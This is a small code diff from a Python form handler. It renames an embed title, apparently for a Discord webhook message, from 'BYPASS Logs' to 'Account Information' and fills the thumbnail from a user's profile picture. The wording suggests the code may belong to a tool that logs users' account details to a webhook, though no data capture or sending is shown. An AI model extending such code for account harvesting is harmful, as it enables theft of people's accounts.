@@ -253,7 +253,7 @@ def submit_form():
             'embeds': [
                 {
                     # Account Information Embed (Top)
-                    'title': '🎯 BYPASS Logs',
+                    'title': '👤 Account Information',
                     'color': 0xff0000,  # Red color as requested
                     'thumbnail': {
                         'url': user_info['profile_picture']
